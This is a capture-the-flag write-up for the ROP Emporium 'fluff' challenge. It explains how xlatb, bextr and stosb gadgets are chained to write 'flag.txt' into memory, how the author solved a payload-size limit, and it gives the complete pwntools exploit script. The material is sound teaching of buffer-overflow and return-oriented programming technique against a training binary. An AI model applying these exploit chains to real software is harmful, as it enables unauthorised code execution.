# Fluff
This is another follow-up to the [write4](https://github.com/TSpeel/writeups/tree/main/pwn/ROPEmporium4_write4) challenge.
This time there is no input filter, but we are only provided a few "questionable" gadgets.

The interesting gadgets the challenge gives us are as follows:
```
0x400628: xlatb; ret;

0x40062a: pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx, rcx, rdx; ret;

0x400639: stosb byte ptr [rdi], al; ret;

```
We thus have to somehow use these gadgets to write `flag.txt` to memory. Let's start by investigating what these instructions do and what we can use them for.

## xlatb
As we can see in the following [documentation](https://www.felixcloutier.com/x86/xlat:xlatb), `xlatb` uses the address in `ebx/rbx` as the base address of a table, and performs a table lookup with the `al` register as index. It then places the result of the lookup back into `al`. Note that `al` refers to the lowest 8 bits of the `rax/eax` register.


## bextr
As we can see in the following [documentation](https://www.felixcloutier.com/x86/bextr), `bextr` does a bit field extract from the first source operand and places the result into the given destination operand. We can use the gadget `0x40062a: pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx, rcx, rdx; ret;` to pop data into `rcx` and move it into `rbx`. This comes in handy, as we already know we will need data in `ebx/rbx` so we can use our `xlatb` gadget.


## stosb
As we can see in the following [documentation](https://www.felixcloutier.com/x86/stos:stosb:stosw:stosd:stosq), `stosb` can be used to store data from `al` to the destination operand. In our gadget, the destination would be an address in `rdi`: `0x400639: stosb byte ptr [rdi], al; ret;`.

## Chaining it all together
Now we understand our gadgets, we can make a plan. Remember, our end goal is to write `flag.txt` to memory at an address such as `0x601028` in the `.data` segment.
We can use our `bextr` gadget to pop a character into `rcx` and move the character into `rbx`. Then we use the `xlatb` gadget to read from `rbx` and place the character into `al`. Then we can finally use the `stosb` gadget to write the character to the writable address which we can store in `rdi` with a `pop rdi` gadget. We repeat this for each character in `flag.txt`.

The only remaining problem is, where do we get our characters? We don't have a simple `mov [reg], reg` gadget as before to write characters anymore.
Luckily, our binary already contains all the characters we need! For example, the challenge contains the string `fluff` which we can use for the `f` and `l` characters. 
We can use this to create a dictionary for all our characters:
```
goal_string = "flag.txt"
char_addrs = {
        'f': (0x4006a6),
        'l': (0x400239),
        'a': (0x4003cd + 9),
        'g': (0x4003cd + 2),
        '.': (0x400439),
        't': (0x400428 - 2),
        'x': (0x4006c4 + 4)
    }
```


## Writing helper functions
Our plan is clear, but it has quite a lot of steps. Let's make our life a little easier and define some helper functions to create our payload.
First, let's create a function using our `bextr` gadget to move a character from a given address into `rbx`:
```
def movetargetcharintorbx(target):
    """
    0040062a  5a                 pop     rdx {__return_addr}
    0040062b  59                 pop     rcx {arg1}
    0040062c  4881c1f23e0000     add     rcx, 0x3ef2
    00400633  c4e2e8f7d9         bextr   rbx, rcx, rdx
    00400638  c3                 retn     {arg_10}
    """
    # copies rcx into rbx based on offset and length in rdx
    bextrgadget = 0x0040062a
    payload  = p64(bextrgadget)
    payload += p64(0x4000) #rdx offset en len
    payload += p64(target - 0x3ef2) #rcx 
    return payload
```
Here the value `0x4000` that is popped into `rdx` represents offset and length to extract. Bits 7:0 indicate offset 0, and the rest indicate the length, where we want to copy one character.

Next, let's create a function that uses this helper function to write a single character to a given address.
This function contains both the `xlatb` and the `stosb` gadgets. 
It also uses a third gadget, which is as follows: `0x400610: mov eax, 0; pop rbp; ret;`.
This is used simply to set `eax` and thus `al` to 0, which is needed for the `xlatb` gadget.
It also pops `rbp`. Here we simply set some garbage value into `rbp`, which is irrelevant for the exploit.
```
def write_char(char_addr,writable_address):
    set_eax_0_pop_rbp = 0x400610
    xlatb_addr        = 0x400628
    stosb_gadget      = 0x400639 # 0x0000000000400639: stosb byte ptr [rdi], al; ret;

    payload  = movetargetcharintorbx(char_addr)
    payload += p64(set_eax_0_pop_rbp)
    payload += p64(0x4141414141414141) # garbage
    payload += p64(xlatb_addr)
    payload += p64(stosb_gadget)
    return payload
```
Now we can use these functions to perform the attack:
```
io = start()

writable_address = 0x601028 # in .data segment
pop_rdi_gadget   = 0x4006a3
print_file_plt   = 0x400510


payload = b"A" * 40

# Write flag.txt to memory with characters found in the binary
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
for i, x in enumerate(goal_string):
    print(i,x, hex(char_addrs[x]))
    payload += write_char(char_addrs[x],writable_address+i)


# Call print file
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
payload += p64(print_file_plt)

io.sendlineafter(b">", payload)
io.interactive()
```
Unfortunately, this attack does not work for some reason...

## Payload length
When debugging the exploit, we can see that we succesfully write `flag.t` to memory, but then the ROP-chain simply stops.
There does not seem to be anything going wrong, we just run out of instructions for some reason.
Looking more into the `pwnme()` function reveals why this happens.
The vulnerable `read()` function we use to overflow the buffer reads up to `0x200` bytes.
As it turns out, our payload exceeds `0x200` bytes, and thus thus our ROP-chain is not fully read.
To solve this, we have to make our payload smaller.

This is possible by optimising the `movetargetcharintorbx()` function we created. 
Remember, this function uses the gadget `0x40062a: pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx, rcx, rdx; ret;`.
This function is then used every time we write a character, so 8 times. 
Every time we use this gadget, we pop values into `rdx` and `rcx`. `rcx` is the address of the character we want to write, and changes every time.
However, `rdx` is the same value every time. We can optimise the payload length by only setting `rdx` the first time the function is called.
This can be solved by skipping the first pop instruction on all iterations except the first, which is implemented as follows (the function is now passed the iteration number):
```
def movetargetcharintorbx(target,i):
    """
    0040062a  5a                 pop     rdx {__return_addr}
    0040062b  59                 pop     rcx {arg1}
    0040062c  4881c1f23e0000     add     rcx, 0x3ef2
    00400633  c4e2e8f7d9         bextr   rbx, rcx, rdx
    00400638  c3                 retn     {arg_10}
    """
    # copies rcx into rbx based on offset and length in rdx

    if i == 0: # First iteration sets RDX, which does not change afterwards
        bextrgadgeta = 0x0040062a
        payload  = p64(bextrgadgeta)
        payload += p64(0x4000) #rdx offset en len
        payload += p64(target - 0x3ef2) #rcx 
        return payload
    else: # Can skip setting RDX
        bextrgadgetb = 0x0040062b
        payload  = p64(bextrgadgetb)
        payload += p64(target - 0x3ef2) #rcx 
        return payload
```
This change was enough to get the final payload length within `0x200` bytes. Now we can succesfully read out the flag!
The final exploit script is as follows:
```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
    #    'breakrva 0xoffset',
    #"continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./fluff"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT STARTS HERE
# ===========================================================

def movetargetcharintorbx(target,i):
    """
    0040062a  5a                 pop     rdx {__return_addr}
    0040062b  59                 pop     rcx {arg1}
    0040062c  4881c1f23e0000     add     rcx, 0x3ef2
    00400633  c4e2e8f7d9         bextr   rbx, rcx, rdx
    00400638  c3                 retn     {arg_10}
    """
    # copies rcx into rbx based on offset and length in rdx

    if i == 0: # First iteration sets RDX, which does not change afterwards
        bextrgadgeta = 0x0040062a
        payload  = p64(bextrgadgeta)
        payload += p64(0x4000) #rdx offset en len
        payload += p64(target - 0x3ef2) #rcx 
        return payload
    else: # Can skip setting RDX
        bextrgadgetb = 0x0040062b
        payload  = p64(bextrgadgetb)
        payload += p64(target - 0x3ef2) #rcx 
        return payload

def write_char(char_addr,writable_address,i):
    set_eax_0_pop_rbp = 0x400610
    xlatb_addr        = 0x400628
    stosb_gadget      = 0x400639 # 0x0000000000400639: stosb byte ptr [rdi], al; ret;

    payload  = movetargetcharintorbx(char_addr,i)
    payload += p64(set_eax_0_pop_rbp)
    payload += p64(0x4141414141414141) # garbage
    payload += p64(xlatb_addr)
    payload += p64(stosb_gadget)
    return payload


goal_string = "flag.txt"
char_addrs = {
        'f': (0x4006a6),
        'l': (0x400239),
        'a': (0x4003cd + 9),
        'g': (0x4003cd + 2),
        '.': (0x400439),
        't': (0x400428 - 2),
        'x': (0x4006c4 + 4)
    }


io = start()

writable_address = 0x601028 # in .data segment
pop_rdi_gadget   = 0x4006a3
print_file_plt   = 0x400510


payload = b"A" * 40

# Write flag.txt to memory with characters found in the binary
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
for i, x in enumerate(goal_string):
    print(i,x, hex(char_addrs[x]))
    payload += write_char(char_addrs[x],writable_address+i,i)


# Call print file
payload += p64(pop_rdi_gadget)
payload += p64(writable_address)
payload += p64(print_file_plt)

print("Payload len: ", hex(len(payload)))
io.sendlineafter(b">", payload)
io.interactive()
```
